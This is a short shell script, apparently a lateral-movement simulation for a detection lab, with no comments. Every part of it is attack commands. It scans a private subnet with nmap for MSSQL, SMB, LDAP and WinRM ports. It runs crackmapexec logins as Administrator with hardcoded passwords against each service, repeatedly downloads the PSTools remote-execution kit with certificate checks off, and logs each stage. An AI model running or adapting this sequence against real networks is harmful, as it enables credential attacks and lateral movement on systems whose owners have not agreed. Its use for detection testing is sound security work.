

curl -kv https://download.sysinternals.com/files/PSTools.zip -o /tmp/pst.zzip -kv




sleep 30 ; nmap 192.168.50.100-240 -p1433 -T4 -A -Pn ; sleep 300 ;  crackmapexec mssql 192.168.50.0/24 -u Administrator  -p admin@123

echo "LM - MSSQL - $(date)" >> /home/cyglass/lmlog.log
sleep 30

curl -kv https://download.sysinternals.com/files/PSTools.zip -o /tmp/pst.zzip -kv


sleep 600 ; nmap 192.168.50.100-240 -p445 -T4 -A -Pn ; sleep 300 ;  crackmapexec smb 192.168.50.0/24 -u Administrator -d known.test -p Cyglass@123

echo "LM - SMB - $(date)" >> /home/cyglass/lmlog.log

sleep 30

curl -kv https://download.sysinternals.com/files/PSTools.zip -o /tmp/pst.zzip -kv


sleep 600 ; nmap 192.168.50.100-240 -p389 -T4 -A -Pn ; sleep 300 ;  crackmapexec ldap 192.168.50.0/24 -u Administrator -d known.test -p Cyglass@123

echo "LM - LDAP - $(date)" >> /home/cyglass/lmlog.log

sleep 30

curl -kv https://download.sysinternals.com/files/PSTools.zip -o /tmp/pst.zzip -kv


sleep 600 ; nmap 192.168.50.100-240 -p5985 -T4 -A -Pn ; sleep 300 ;  crackmapexec winrm 192.168.50.0/24 -u Administrator -d known.test -p Cyglass@123

echo "LM - WinRM - $(date)" >> /home/cyglass/lmlog.log

sleep 30


